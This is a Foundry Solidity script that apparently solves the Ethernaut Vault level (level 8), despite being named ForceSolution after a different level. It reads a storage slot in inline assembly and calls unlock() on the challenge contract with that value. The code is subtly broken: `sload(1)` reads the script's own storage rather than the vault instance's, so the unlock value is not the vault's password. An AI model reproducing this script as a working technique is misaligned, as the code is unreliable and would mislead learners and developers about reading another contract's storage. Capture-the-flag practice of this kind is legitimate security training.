// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
interface IVault {
    function unlock(bytes32 _password) external;
}

contract ForceSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0xB7257D8Ba61BD1b3Fb7249DCd9330a023a5F3670;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);

        // YOUR SOLUTION HERE
        bytes32 value;

        assembly {
            value := sload(1)
        }

        IVault(challengeInstance).unlock(value);

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(8));
    }
}
